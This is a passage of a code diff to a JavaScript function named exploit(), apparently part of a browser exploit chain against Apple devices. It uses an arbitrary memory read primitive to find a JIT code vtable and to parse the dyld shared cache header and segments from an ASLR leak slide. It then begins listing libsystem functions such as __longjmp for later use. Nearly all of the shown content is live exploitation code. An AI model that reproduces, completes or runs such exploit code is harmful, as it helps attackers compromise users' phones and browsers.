@@ -501,7 +501,6 @@ function exploit(){
                 return arr;
             },
             readInt64: function(addrObj) {
-                
                 var offset = 0;
                 var writer = this.create_writer(addrObj);
                 return writer.read_i64(offset);
@@ -535,7 +534,7 @@ function exploit(){
         log('[+] NativeJitCode vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb,0);
         log(“anchor” + anchor)
-        var hdr1 = Sub(anchor, anchor.lo() & 0xfff);
+       // var hdr1 = Sub(anchor, anchor.lo() & 0xfff);
         let cnt = 0;
         var ccc = 0;
         var vtab = 0x1B205A808;
@@ -555,7 +554,7 @@ function exploit(){
         //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
         //tmp = base;
         var hdr = Add(0x180000000,slide);
-        log(hdr + hdr1)
+        //log(hdr + hdr1)
         var base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
         var nsegs = memory.u32(Add(hdr, 0x14));
@@ -563,7 +562,7 @@ function exploit(){
         log('[+] The dyld shared cache seems to have '+nsegs+' segments.');
         log(memory.u32(Add(hdr,0x14)))
         log(memory.u32(Add(hdr,0x10)))
-        var segdata  = memory.read(Add(hdr,memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
+        var segdata  = memory.copyfrom(Add(hdr,memory.u32(Add(hdr, 0x10))),0, nsegs * 0x20);
         var segs     = [];
         for(var i = 0; i < nsegs; ++i)
         {
@@ -589,10 +588,10 @@ function exploit(){
         }
         var cache_slide = Sub(hdr,base_seg.addr)
         alert ("cacheslides" + cache_slide + "vs aslr leak slide" + slide);
-        for(var i = 0; i < segs.length; ++i)
+       /* for(var i = 0; i < segs.length; ++i)
         {
             segs[i].addr = Add(segs[i].addr,slide)
-        }
+        }*/
         var libs =
         {
             "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
